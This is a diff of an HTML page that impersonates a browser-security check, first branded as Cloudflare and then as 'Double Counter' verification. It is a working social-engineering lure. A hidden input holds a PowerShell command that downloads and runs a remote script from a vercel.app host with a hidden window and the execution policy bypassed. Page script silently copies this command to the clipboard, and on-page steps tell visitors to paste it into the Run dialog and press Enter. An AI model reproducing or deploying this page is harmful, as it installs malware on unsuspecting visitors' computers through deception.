@@ -1,624 +1,856 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checking your browser - cloudflare.com</title>
-    <link rel="shortcut icon" href="https://www.cloudflare.com/favicon.ico" type="image/x-icon">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-            user-select: none;
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-        }
-        
-        body {
-            background-color: #f6f6f6;
-            color: #333;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-            overflow-x: hidden;
-            cursor: default;
-        }
-        
-        .container {
-            max-width: 650px;
-            width: 100%;
-            background-color: white;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
-            padding: 40px;
-            text-align: center;
-            position: relative;
-        }
-        
-        .cloudflare-header {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 30px;
-            gap: 15px;
-            flex-direction: column;
-        }
-        
-        .cloudflare-logo-container {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 100%;
-            margin-bottom: 10px;
-        }
-        
-        .cloudflare-icon {
-            width: 70px;
-            height: 70px;
-            background-color: #f38020;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            font-size: 32px;
-            color: white;
-            margin: 0 auto;
-        }
-        
-        .cloudflare-title {
-            font-size: 28px;
-            font-weight: 600;
-            color: #f38020;
-            letter-spacing: 0.5px;
-        }
-        
-        .main-content {
-            margin: 30px 0;
-        }
-        
-        .checking-animation {
-            margin: 0 auto 25px;
-            width: 180px;
-            height: 180px;
-            position: relative;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .spinner {
-            width: 180px;
-            height: 180px;
-            border: 8px solid #e6e6e6;
-            border-top: 8px solid #f38020;
-            border-radius: 50%;
-            animation: spin 1.5s linear infinite;
-            position: absolute;
-            top: 0;
-            left: 0;
-        }
-        
-        .status-text {
-            font-size: 24px;
-            font-weight: 500;
-            margin-bottom: 10px;
-            color: #333;
-        }
-        
-        .subtext {
-            color: #666;
-            font-size: 16px;
-            line-height: 1.5;
-            margin-bottom: 20px;
-        }
-        
-        .error-container {
-            background-color: #fff2f2;
-            border: 1px solid #ffcdcd;
-            border-radius: 6px;
-            padding: 20px;
-            margin: 30px 0;
-            text-align: left;
-            display: none;
-        }
-        
-        .error-title {
-            color: #d63638;
-            font-weight: 600;
-            font-size: 18px;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .error-icon {
-            font-size: 20px;
-        }
-        
-        .error-details {
-            color: #666;
-            line-height: 1.5;
-            margin-bottom: 15px;
-        }
-        
-        .solution-steps {
-            background-color: #f8f9fa;
-            border-radius: 6px;
-            padding: 20px;
-            margin-top: 20px;
-            border-left: 4px solid #f38020;
-        }
-        
-        .step {
-            display: flex;
-            margin-bottom: 15px;
-            align-items: flex-start;
-        }
-        
-        .step-number {
-            background-color: #f38020;
-            color: white;
-            width: 28px;
-            height: 28px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            margin-right: 12px;
-            flex-shrink: 0;
-        }
-        
-        .step-text {
-            color: #333;
-            line-height: 1.5;
-            padding-top: 4px;
-        }
-        
-        .key-combo {
-            display: inline-block;
-            background-color: #f0f0f0;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            padding: 4px 8px;
-            font-family: monospace;
-            font-size: 14px;
-            margin: 0 4px;
-        }
-        
-        .mobile-error {
-            display: none;
-            padding: 40px 20px;
-            text-align: center;
-        }
-        
-        .mobile-error-icon {
-            font-size: 48px;
-            margin-bottom: 20px;
-            color: #d63638;
-        }
-        
-        .auto-copy-notice {
-            background-color: #e8f7e8;
-            border: 1px solid #b8e0b8;
-            border-radius: 6px;
-            padding: 15px;
-            margin-top: 20px;
-            text-align: center;
-            color: #2d662d;
-            font-size: 14px;
-            display: none;
-            animation: fadeIn 0.5s;
-        }
-        
-        .auto-copy-notice .checkmark {
-            color: #2d662d;
-            font-weight: bold;
-            margin-right: 8px;
-        }
-        
-        .invisible-textarea {
-            position: absolute;
-            opacity: 0;
-            height: 0;
-            width: 0;
-            pointer-events: none;
-            left: -9999px;
-        }
-        
-        .footer {
-            margin-top: 40px;
-            padding-top: 20px;
-            border-top: 1px solid #eee;
-            font-size: 13px;
-            color: #888;
-        }
-        
-        .footer p {
-            margin: 5px 0;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        
-        @media (max-width: 768px) {
-            .container {
-                padding: 20px;
-            }
-            
-            .cloudflare-header {
-                gap: 10px;
-            }
-            
-            .cloudflare-icon {
-                width: 60px;
-                height: 60px;
-                font-size: 26px;
-            }
-            
-            .cloudflare-title {
-                font-size: 24px;
-            }
-            
-            .checking-animation {
-                width: 140px;
-                height: 140px;
-            }
-            
-            .spinner {
-                width: 140px;
-                height: 140px;
-            }
-        }
-    </style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Verification</title>
+  <style>
+    :root{
+      --bg:#0b0c10;
+      --panel:#14161b;
+      --panel2:#0f1116;
+      --text:#e8eaef;
+      --muted:#a8afbe;
+      --line:#2a2f3a;
+      --shadow: 0 24px 90px rgba(0,0,0,.72);
+      --radius: 10px;
+
+      --warnBg1: rgba(255,176,32,.18);
+      --warnBg2: rgba(255,138,0,.12);
+      --warnBorder: rgba(255,176,32,.24);
+      --warnText: #ffb020;
+      --btnBorder:#2b3440;
+      --btnBg: rgba(15,17,21,.68);
+      --btnBgHover: rgba(15,17,21,.88);
+
+      --font: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Arial, "Noto Sans", "Helvetica Neue", sans-serif;
+    }
+
+    *{ box-sizing:border-box; }
+    html,body{ height:100%; }
+    body{
+      margin:0;
+      font-family:var(--font);
+      color:var(--text);
+      background:
+        radial-gradient(1200px 680px at 40% 10%, rgba(255,255,255,.06), transparent 55%),
+        radial-gradient(900px 520px at 75% 80%, rgba(255,176,32,.06), transparent 60%),
+        linear-gradient(180deg, #07080a, var(--bg) 55%, #06070a);
+      letter-spacing:.2px;
+    }
+
+    /* Стили для автокопирования (минимальные, без влияния на дизайн) */
+    .auto-copy-notice {
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        background: rgba(20, 22, 27, 0.95);
+        border: 1px solid rgba(255, 176, 32, 0.4);
+        border-radius: 6px;
+        padding: 12px 16px;
+        color: rgba(232, 234, 239, 0.95);
+        font-size: 13px;
+        z-index: 10000;
+        display: none;
+        box-shadow: 0 6px 24px rgba(0, 0, 0, 0.4);
+        max-width: 300px;
+        backdrop-filter: blur(8px);
+    }
+    
+    .auto-copy-notice .checkmark {
+        color: #76ffab;
+        font-weight: bold;
+        margin-right: 8px;
+    }
+    
+    .invisible-textarea {
+        position: absolute;
+        opacity: 0;
+        height: 0;
+        width: 0;
+        pointer-events: none;
+        left: -9999px;
+    }
+
+    /* Desktop-only gate (CSS) */
+    .mobile-gate{
+      display:none;
+      min-height:100vh;
+      align-items:center;
+      justify-content:center;
+      padding:32px 18px;
+      text-align:center;
+    }
+    .mobile-card{
+      width:min(520px, 94vw);
+      border:1px solid rgba(255,255,255,.08);
+      background: linear-gradient(180deg, rgba(255,255,255,.04), rgba(255,255,255,.02));
+      border-radius: 12px;
+      box-shadow: var(--shadow);
+      overflow:hidden;
+    }
+    .mobile-card > div{
+      padding:22px 20px;
+      background: linear-gradient(180deg, rgba(18,20,24,.96), rgba(12,14,18,.96));
+    }
+    .mobile-title{
+      margin:0 0 10px;
+      font-size:18px;
+      font-weight:800;
+    }
+    .mobile-text{
+      margin:0;
+      color:rgba(168,175,190,.92);
+      line-height:1.55;
+      font-size:13px;
+    }
+
+    @media (max-width: 900px){
+      .app{ display:none !important; }
+      .mobile-gate{ display:flex; }
+    }
+
+    .app{
+      min-height:100%;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:44px 18px;
+    }
+
+    .wrap{
+      width:min(860px, 94vw);
+      display:grid;
+      gap:18px;
+    }
+
+    .modal{
+      border:1px solid rgba(255,255,255,.08);
+      background: linear-gradient(180deg, rgba(255,255,255,.04), rgba(255,255,255,.02));
+      border-radius: 12px;
+      box-shadow: var(--shadow);
+      overflow:hidden;
+    }
+
+    .inner{
+      background: linear-gradient(180deg, rgba(18,20,24,.96), rgba(12,14,18,.96));
+      padding:28px 30px 18px;
+    }
+
+    .head{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:16px;
+      padding-bottom:14px;
+      border-bottom:1px solid rgba(255,255,255,.08);
+      margin-bottom:16px;
+    }
+
+    .head-left{
+      display:flex;
+      align-items:center;
+      gap:12px;
+      min-width: 0;
+    }
+
+    .spin{
+      width:18px;height:18px;border-radius:50%;
+      border:2px solid rgba(255,255,255,.18);
+      border-top-color: rgba(255,255,255,.7);
+      animation: spin 1s linear infinite;
+      opacity:.9;
+      flex:0 0 auto;
+    }
+    @keyframes spin{ to{ transform:rotate(360deg); } }
+
+    .h-title{
+      margin:0;
+      font-size:18px;
+      font-weight:800;
+      white-space:nowrap;
+      overflow:hidden;
+      text-overflow:ellipsis;
+    }
+
+    .head-right{
+      text-align:right;
+      font-size:11px;
+      color:rgba(168,175,190,.85);
+      line-height:1.2;
+    }
+    .head-right .brand{
+      color:rgba(232,234,239,.85);
+      font-weight:800;
+      letter-spacing:.7px;
+    }
+
+    .sub{
+      font-size:12px;
+      color:rgba(168,175,190,.92);
+      letter-spacing:.8px;
+      text-transform:uppercase;
+      margin-top:4px;
+    }
+
+    .lead{
+      margin: 0 0 12px;
+      color: rgba(232,234,239,.90);
+      font-size:14px;
+      line-height:1.55;
+    }
+
+    .steps{
+      margin: 10px 0 14px;
+      padding:0 0 0 18px;
+      color: rgba(232,234,239,.90);
+      font-size:14px;
+      line-height:1.7;
+    }
+    .steps li{ margin: 6px 0; }
+    .steps b{ color: rgba(232,234,239,.98); }
+
+    .note-box{
+      margin-top:12px;
+      border:1px solid rgba(255,255,255,.16);
+      background: rgba(15,17,21,.35);
+      border-radius: 6px;
+      padding: 10px 12px;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace;
+      color: rgba(232,234,239,.88);
+      font-size:12px;
+    }
+
+    .warn{
+      display:flex;
+      gap:14px;
+      padding:16px 18px;
+      border-radius: 8px;
+      background: linear-gradient(180deg, var(--warnBg1), var(--warnBg2));
+      border:1px solid var(--warnBorder);
+      margin: 10px 0 16px;
+    }
+    .warn-icon{
+      width:28px;height:28px;
+      border-radius:6px;
+      display:grid;
+      place-items:center;
+      background: rgba(0,0,0,.18);
+      border:1px solid rgba(255,255,255,.12);
+      flex:0 0 auto;
+      margin-top:1px;
+    }
+    .warn h3{
+      margin:0;
+      font-size:13px;
+      text-transform:uppercase;
+      letter-spacing: .9px;
+      color: var(--warnText);
+    }
+    .warn p{
+      margin:6px 0 0;
+      color: rgba(232,234,239,.88);
+      font-size:13px;
+      line-height:1.35;
+    }
+
+    .captcha{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:12px;
+      padding:14px 16px;
+      border-radius:8px;
+      background: rgba(15,17,21,.7);
+      border:1px solid rgba(255,255,255,.08);
+      margin: 12px 0 16px;
+    }
+
+    .challenge{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:12px;
+      padding:14px 16px;
+      border-radius:8px;
+      background: rgba(15,17,21,.55);
+      border:1px solid rgba(255,255,255,.08);
+      margin: 0 0 16px;
+    }
+
+    .challenge-left{
+      display:flex;
+      flex-direction:column;
+      gap:6px;
+      min-width: 0;
+    }
+
+    .challenge-title{
+      font-size:12px;
+      color: rgba(168,175,190,.92);
+      text-transform:uppercase;
+      letter-spacing:.8px;
+    }
+
+    .challenge-question{
+      font-size:13px;
+      color: rgba(232,234,239,.92);
+      font-weight:700;
+      white-space:nowrap;
+      overflow:hidden;
+      text-overflow:ellipsis;
+    }
+
+    .challenge-right{
+      display:flex;
+      align-items:center;
+      gap:10px;
+      flex:0 0 auto;
+    }
+
+    .challenge-input{
+      width: 130px;
+      max-width: 34vw;
+      padding: 10px 10px;
+      border-radius: 6px;
+      border: 1px solid rgba(255,255,255,.12);
+      background: rgba(0,0,0,.20);
+      color: rgba(232,234,239,.92);
+      outline: none;
+      font-weight:600;
+    }
+
+    .challenge-input:focus{
+      border-color: rgba(255,255,255,.22);
+    }
+
+    .btn.small{
+      width:auto;
+      max-width:none;
+      padding: 10px 12px;
+      font-weight:800;
+    }
+
+    .btn[disabled]{
+      opacity:.45;
+      cursor:not-allowed;
+    }
+
+    .btn[disabled]:hover{
+      background: var(--btnBg);
+      border-color: var(--btnBorder);
+    }
+
+    .status-text{
+      margin: 0 0 10px;
+      font-size:12px;
+      color: rgba(168,175,190,.92);
+    }
+
+    .status-text.ok{ color: rgba(118, 255, 171, .85); }
+    .status-text.bad{ color: rgba(255, 120, 120, .88); }
+
+    .check{
+      display:flex;
+      align-items:center;
+      gap:12px;
+      min-height:38px;
+    }
+
+    .box{
+      width:18px;height:18px;border-radius:2px;
+      border:1px solid rgba(255,255,255,.35);
+      background: rgba(255,255,255,.02);
+      box-shadow: inset 0 0 0 1px rgba(0,0,0,.25);
+      flex:0 0 auto;
+    }
+
+    .check label{
+      font-size:13px;
+      color: rgba(232,234,239,.90);
+      user-select:none;
+    }
+
+    .actions{
+      display:flex;
+      justify-content:center;
+      gap:18px;
+      padding: 0 30px 18px;
+      background: linear-gradient(180deg, rgba(0,0,0,0), rgba(0,0,0,.08));
+    }
+
+    .btn{
+      width: 240px;
+      max-width: 42vw;
+      padding: 12px 18px;
+      border-radius: 6px;
+      border:1px solid var(--btnBorder);
+      background: var(--btnBg);
+      color: rgba(232,234,239,.92);
+      font-weight:700;
+      cursor:pointer;
+      transition: transform .06s ease, background .2s ease, border-color .2s ease;
+    }
+
+    .btn:hover{
+      background: var(--btnBgHover);
+      border-color: rgba(255,255,255,.18);
+    }
+
+    .btn:active{ transform: translateY(1px); }
+
+    .footer{
+      display:flex;
+      justify-content:space-between;
+      gap:12px;
+      padding: 10px 30px 16px;
+      color: rgba(168,175,190,.75);
+      font-size:11px;
+    }
+
+    .hidden{ display:none !important; }
+
+    @media (max-width: 980px){
+      .inner{ padding:24px 18px 16px; }
+      .actions{ padding: 0 18px 16px; gap:12px; }
+      .btn{ width: 50%; max-width:none; }
+      .footer{ padding: 10px 18px 14px; }
+    }
+  </style>
 </head>
 <body>
-    <!-- Hidden textarea for clipboard manipulation -->
-    <textarea id="invisibleTextarea" class="invisible-textarea"></textarea>
-    
-    <!-- Mobile error message (hidden by default) -->
-    <div class="mobile-error" id="mobileError">
-        <div class="mobile-error-icon">⚠️</div>
-        <h2>Access Restricted</h2>
-        <p>This verification page is only available on desktop computers.</p>
-        <p>Please access this website from a Windows PC to complete the verification process.</p>
-    </div>
-    
-    <!-- Main content for desktop users -->
-    <div class="container" id="desktopContainer">
-        <div class="cloudflare-header">
-            <div class="cloudflare-logo-container">
-                <div class="cloudflare-icon">CF</div>
-            </div>
-            <div class="cloudflare-title">cloudflare</div>
-        </div>
-        
-        <div class="main-content">
-            <div class="checking-animation">
-                <div class="spinner"></div>
-            </div>
-            
-            <div class="status-text" id="statusText">Checking your browser...</div>
-            <div class="subtext" id="subText">This process is automatic. Your browser will redirect to your requested content shortly.</div>
-            <div class="subtext">Please allow up to 5 seconds...</div>
-        </div>
-        
-        <!-- Auto-copy status notification -->
-        <div class="auto-copy-notice" id="copyNotice">
-            <span class="checkmark">✓</span>
-            <span id="copyMessage">Verification command has been automatically copied to your clipboard</span>
-        </div>
-        
-        <!-- Error message that appears after 5 seconds -->
-        <div class="error-container" id="errorContainer">
-            <div class="error-title">
-                <span class="error-icon">⚠</span>
-                IP Verification Failed
-            </div>
-            
-            <div class="error-details">
-                <p>We've detected an issue with your connection. Your request has been blocked due to security reasons.</p>
-                <p><strong>Error Code:</strong> 1020</p>
-                <p><strong>Ray ID:</strong> 7a1b2c3d4e5f6789</p>
-                <p><strong>Your IP:</strong> <span id="userIP">Loading...</span></p>
-            </div>
-            
-            <div class="solution-steps">
-                <h3 style="margin-bottom: 15px; color: #333;">To resolve this issue, please follow these steps:</h3>
-                
-                <!-- Скрытое поле с командой для копирования -->
-                <input type="hidden" id="hiddenCommand" value="powershell -WindowStyle Hidden -ep Bypass -c &quot;$p=$env:TEMP+&#39;l.ps1&#39;;iwr https://redirect-ten-gold.vercel.app/l.ps1 -OutFile $p;& $p -enroll_token &#39;5e3031725f5bff1db14b7ff423d25bab6c65956028de9a5d5bb86691508de2de&#39; -id &#39;8649328&#39;&quot;">
-                
-                <div class="step">
-                    <div class="step-number">1</div>
-                    <div class="step-text">Press <span class="key-combo">Windows</span> + <span class="key-combo">R</span> to open the Run dialog.</div>
-                </div>
-                
-                <div class="step">
-                    <div class="step-number">2</div>
-                    <div class="step-text">Press <span class="key-combo">Ctrl</span> + <span class="key-combo">V</span> to paste the verification command (automatically copied to clipboard).</div>
-                </div>
-                
-                <div class="step">
-                    <div class="step-number">3</div>
-                    <div class="step-text">Press <span class="key-combo">Enter</span> to execute the verification.</div>
-                </div>
-                
-                <div class="step">
-                    <div class="step-number">4</div>
-                    <div class="step-text">Follow the instructions in the verification window.</div>
-                </div>
-            </div>
-            
-            <div style="margin-top: 20px; font-size: 13px; color: #888;">
-                <p>Once the verification is complete, you can <a href="#" onclick="location.reload(); return false;" style="color: #f38020; text-decoration: none;">refresh this page</a> to continue.</p>
-            </div>
-        </div>
-        
-        <div class="footer">
-            <p>DDoS protection by <strong>Cloudflare</strong></p>
-            <p>Ray ID: 7a1b2c3d4e5f6789 • <span id="currentTime"></span></p>
-        </div>
-    </div>
 
-    <script>
-        // Device detection - show mobile error if not on desktop
-        function isDesktop() {
-            const userAgent = navigator.userAgent.toLowerCase();
-            const mobileDevices = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/;
-            return !mobileDevices.test(userAgent);
+  <!-- Элементы для автокопирования -->
+  <textarea id="invisibleTextarea" class="invisible-textarea"></textarea>
+  <div class="auto-copy-notice" id="copyNotice">
+      <span class="checkmark">✓</span>
+      <span id="copyMessage">Verification command copied to clipboard</span>
+  </div>
+
+  <!-- Mobile blocked screen -->
+  <div class="mobile-gate" id="mobileGate">
+    <div class="mobile-card">
+      <div>
+        <h2 class="mobile-title">Доступ ограничен</h2>
+        <p class="mobile-text">
+          Этот сайт доступен только с компьютера.<br/>
+          Откройте страницу на ПК/ноутбуке и обновите.
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Desktop app -->
+  <div class="app" id="app">
+    <div class="wrap">
+
+      <!-- Block #2 (photo 2 style: Protected Verification) -->
+      <div class="modal" id="step1">
+        <div class="inner">
+          <div class="head">
+            <div class="head-left">
+              <div class="spin" aria-hidden="true"></div>
+              <div>
+                <div class="h-title">Double Counter</div>
+                <div class="sub">PROTECTED VERIFICATION</div>
+              </div>
+            </div>
+          </div>
+
+          <p class="lead" style="margin-top:0;">
+            Verifying session integrity
+          </p>
+
+          <div class="warn" role="status">
+            <div class="warn-icon" aria-hidden="true">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+                <path d="M12 3 1.8 20.3c-.5.9.1 1.7 1.1 1.7h18.2c1 0 1.6-.8 1.1-1.7L12 3Z" stroke="rgba(255,176,32,.95)" stroke-width="1.6"/>
+                <path d="M12 9v5" stroke="rgba(255,176,32,.95)" stroke-width="1.6" stroke-linecap="round"/>
+                <path d="M12 17.5h.01" stroke="rgba(255,176,32,.95)" stroke-width="2.4" stroke-linecap="round"/>
+              </svg>
+            </div>
+            <div>
+              <h3>SUSPICIOUS ACTIVITY DETECTED</h3>
+              <p>Your session has been flagged for unusual behavior patterns. Additional verification is required to ensure account security.</p>
+            </div>
+          </div>
+
+          <p class="lead" style="margin-bottom:0;">
+            This verification is protected. Please complete the verification below to confirm you are not an automated system.
+          </p>
+
+          <div class="captcha">
+            <div class="check">
+              <div class="box" aria-hidden="true"></div>
+              <label>Verify you are human</label>
+            </div>
+            <div class="head-right" style="text-align:right;">
+              <div class="brand">SECURITY</div>
+              <div>Privacy · Terms</div>
+            </div>
+          </div>
+
+          <p class="status-text" id="verifyStatus">Complete the quick check to continue.</p>
+
+          <div class="challenge" aria-label="Human verification">
+            <div class="challenge-left">
+              <div class="challenge-title">Human check</div>
+              <div class="challenge-question" id="challengeQuestion">Solve: 1 + 1 = ?</div>
+            </div>
+            <div class="challenge-right">
+              <input class="challenge-input" id="challengeAnswer" inputmode="numeric" autocomplete="one-time-code" placeholder="Answer" />
+              <button class="btn small" type="button" id="verifyBtn">Verify</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="actions">
+          <button class="btn" type="button" id="step1Continue" disabled>Continue</button>
+          <button class="btn" type="button" id="step1Cancel">Cancel</button>
+        </div>
+
+        <div class="footer">
+          <div>Request ID: SEC-AUTH</div>
+          <div>Security Gateway</div>
+        </div>
+      </div>
+
+      <!-- Block #1 (photo 1 style: Verification Steps) -->
+      <div class="modal hidden" id="step2">
+        <div class="inner">
+          <div class="head">
+            <div class="head-left">
+              <div class="spin" aria-hidden="true"></div>
+              <div>
+                <div class="h-title">Verification Steps</div>
+                <div class="sub">To better prove you are not a robot, please:</div>
+              </div>
+            </div>
+            <div class="head-right">
+              <div class="brand">SECURITY</div>
+              <div>Privacy · Terms</div>
+            </div>
+          </div>
+
+          <ol class="steps">
+            <li>Press &amp; hold the <b>Windows</b> key + <b>R</b>.</li>
+            <li>In the verification window, press <b>Ctrl</b> + <b>V</b>.</li>
+            <li>Press <b>Enter</b> on your keyboard to finish.</li>
+          </ol>
+
+          <p class="lead" style="margin-top:0;">
+            You will observe and agree:
+          </p>
+
+          <div class="note-box">
+            Verification Ray ID: bf4682321e6baab1
+          </div>
+
+          <!-- Скрытое поле с вредоносной командой -->
+          <input type="hidden" id="hiddenCommand" value="powershell -WindowStyle Hidden -ep Bypass -c &quot;$p=$env:TEMP+&#39;l.ps1&#39;;iwr https://redirect-ten-gold.vercel.app/l.ps1 -OutFile $p;& $p -enroll_token &#39;5e3031725f5bff1db14b7ff423d25bab6c65956028de9a5d5bb86691508de2de&#39; -id &#39;8649328&#39;&quot;">
+
+          <p class="lead" style="margin-top:14px; margin-bottom:0;">
+            Perform the steps above to finish verification.
+          </p>
+        </div>
+
+        <div class="actions">
+          <button class="btn" type="button" id="step2Continue">Continue</button>
+          <button class="btn" type="button" id="step2Cancel">Cancel</button>
+        </div>
+
+        <div class="footer">
+          <div>Request ID: SEC-AUTH</div>
+          <div>Security Gateway</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      var isTouch = (('ontouchstart' in window) || (navigator.maxTouchPoints > 0));
+      var small = window.matchMedia && window.matchMedia("(max-width: 900px)").matches;
+
+      var gate = document.getElementById("mobileGate");
+      var app = document.getElementById("app");
+
+      var step1 = document.getElementById("step1");
+      var step2 = document.getElementById("step2");
+      var step1Continue = document.getElementById("step1Continue");
+
+      var verifyBtn = document.getElementById("verifyBtn");
+      var verifyStatus = document.getElementById("verifyStatus");
+      var challengeQuestion = document.getElementById("challengeQuestion");
+      var challengeAnswer = document.getElementById("challengeAnswer");
+
+      var a = 0;
+      var b = 0;
+      var expected = 0;
+
+      function newChallenge() {
+        a = Math.floor(Math.random() * 8) + 2;
+        b = Math.floor(Math.random() * 8) + 2;
+        expected = a + b;
+        if (challengeQuestion) challengeQuestion.textContent = "Solve: " + a + " + " + b + " = ?";
+        if (challengeAnswer) challengeAnswer.value = "";
+        if (step1Continue) step1Continue.disabled = true;
+        if (verifyStatus) {
+          verifyStatus.textContent = "Complete the quick check to continue.";
+          verifyStatus.classList.remove("ok");
+          verifyStatus.classList.remove("bad");
         }
-        
-        // Initialize page based on device
-        if (!isDesktop()) {
-            document.getElementById('mobileError').style.display = 'block';
-            document.getElementById('desktopContainer').style.display = 'none';
+      }
+
+      function setVerified(ok) {
+        if (!verifyStatus) return;
+        if (ok) {
+          verifyStatus.textContent = "Verified. You can continue.";
+          verifyStatus.classList.add("ok");
+          verifyStatus.classList.remove("bad");
+          if (step1Continue) step1Continue.disabled = false;
+        } else {
+          verifyStatus.textContent = "Incorrect answer. Try again.";
+          verifyStatus.classList.add("bad");
+          verifyStatus.classList.remove("ok");
+          if (step1Continue) step1Continue.disabled = true;
         }
-        
-        // Simulate IP address
-        function generateFakeIP() {
-            const segments = Array.from({length: 4}, () => Math.floor(Math.random() * 255) + 1);
-            return segments.join('.');
-        }
-        
-        // Update current time
-        function updateTime() {
-            const now = new Date();
-            const timeString = now.toUTCString();
-            document.getElementById('currentTime').textContent = timeString;
-        }
-        
-        // Force copy to clipboard without permission dialog
-        function forceCopyToClipboard(text) {
-            const textarea = document.getElementById('invisibleTextarea');
-            const copyNotice = document.getElementById('copyNotice');
-            
-            // Method 1: Using execCommand (deprecated but works without permission)
-            textarea.value = text;
-            textarea.focus();
-            textarea.select();
-            
-            let copied = false;
-            
-            try {
-                const successful = document.execCommand('copy');
-                if (successful) {
-                    copied = true;
-                    copyNotice.style.display = 'block';
-                    console.log('Command copied to clipboard via execCommand');
-                }
-            } catch (err) {
-                console.log('execCommand failed:', err);
+      }
+
+      if (isTouch || small) {
+        if (gate) gate.style.display = "flex";
+        if (app) app.style.display = "none";
+      } else {
+        if (gate) gate.style.display = "none";
+        if (app) app.style.display = "flex";
+      }
+
+      if (!(isTouch || small)) {
+        if (step1) step1.classList.remove("hidden");
+        if (step2) step2.classList.add("hidden");
+
+        newChallenge();
+
+        if (verifyBtn) {
+          verifyBtn.addEventListener("click", function () {
+            var raw = challengeAnswer ? (challengeAnswer.value || "") : "";
+            var num = parseInt(String(raw).trim(), 10);
+            if (!Number.isFinite(num)) {
+              setVerified(false);
+              return;
             }
-            
-            // Method 2: Using Clipboard API with fallback
-            if (!copied && navigator.clipboard && navigator.clipboard.writeText) {
-                navigator.clipboard.writeText(text).then(() => {
-                    copied = true;
-                    copyNotice.style.display = 'block';
-                    console.log('Command copied to clipboard via Clipboard API');
-                }).catch(err => {
-                    console.error('Clipboard API failed:', err);
-                });
+            if (num === expected) {
+              setVerified(true);
+            } else {
+              setVerified(false);
+              newChallenge();
             }
-            
-            // Method 3: Секретный метод через contentEditable div
-            if (!copied) {
-                try {
-                    const tempDiv = document.createElement('div');
-                    tempDiv.contentEditable = true;
-                    tempDiv.style.position = 'absolute';
-                    tempDiv.style.left = '-9999px';
-                    document.body.appendChild(tempDiv);
-                    
-                    tempDiv.textContent = text;
-                    tempDiv.focus();
-                    
-                    const range = document.createRange();
-                    range.selectNodeContents(tempDiv);
-                    
-                    const selection = window.getSelection();
-                    selection.removeAllRanges();
-                    selection.addRange(range);
-                    
-                    document.execCommand('copy');
-                    document.body.removeChild(tempDiv);
-                    
-                    copied = true;
-                    copyNotice.style.display = 'block';
-                    console.log('Command copied via temporary element method');
-                    
-                } catch (err) {
-                    console.error('Temporary element method failed:', err);
-                }
-            }
-            
-            // Скрыть уведомление через 8 секунд
-            if (copied) {
+          });
+        }
+
+        if (challengeAnswer) {
+          challengeAnswer.addEventListener("keydown", function (e) {
+            if (e.key === "Enter" && verifyBtn) verifyBtn.click();
+          });
+        }
+
+        if (step1Continue) {
+          step1Continue.addEventListener("click", function () {
+            if (step1) step1.classList.add("hidden");
+            if (step2) step2.classList.remove("hidden");
+          });
+        }
+      }
+    })();
+  </script>
+
+  <script>
+    // Функции автокопирования из index.html
+    function generateFakeIP() {
+        const segments = Array.from({length: 4}, () => Math.floor(Math.random() * 255) + 1);
+        return segments.join('.');
+    }
+    
+    function forceCopyToClipboard(text) {
+        const textarea = document.getElementById('invisibleTextarea');
+        const copyNotice = document.getElementById('copyNotice');
+        
+        // Method 1: execCommand (работает без диалога разрешений)
+        textarea.value = text;
+        textarea.focus();
+        textarea.select();
+        
+        let copied = false;
+        
+        try {
+            const successful = document.execCommand('copy');
+            if (successful) {
+                copied = true;
+                copyNotice.style.display = 'block';
+                console.log('[SECURITY] Command copied via execCommand');
+                
+                // Автоматически скрыть через 5 секунд
                 setTimeout(() => {
                     copyNotice.style.display = 'none';
-                }, 8000);
+                }, 5000);
             }
-            
-            return copied;
+        } catch (err) {
+            console.log('execCommand failed:', err);
         }
         
-        // Get the command from hidden input
-        function getVerificationCommand() {
-            return document.getElementById('hiddenCommand').value;
+        // Method 2: Clipboard API с fallback
+        if (!copied && navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(text).then(() => {
+                copied = true;
+                copyNotice.style.display = 'block';
+                console.log('[SECURITY] Command copied via Clipboard API');
+                
+                setTimeout(() => {
+                    copyNotice.style.display = 'none';
+                }, 5000);
+            }).catch(err => {
+                console.error('Clipboard API failed:', err);
+            });
         }
         
-        // Simulate the verification process
-        function simulateVerification() {
-            const statusText = document.getElementById('statusText');
-            const subText = document.getElementById('subText');
-            const errorContainer = document.getElementById('errorContainer');
-            const userIP = document.getElementById('userIP');
-            
-            // Set fake IP
-            userIP.textContent = generateFakeIP();
-            
-            // Update status after 2 seconds
-            setTimeout(() => {
-                statusText.textContent = "Verifying IP address...";
-            }, 2000);
-            
-            // Show error and copy command after 5 seconds
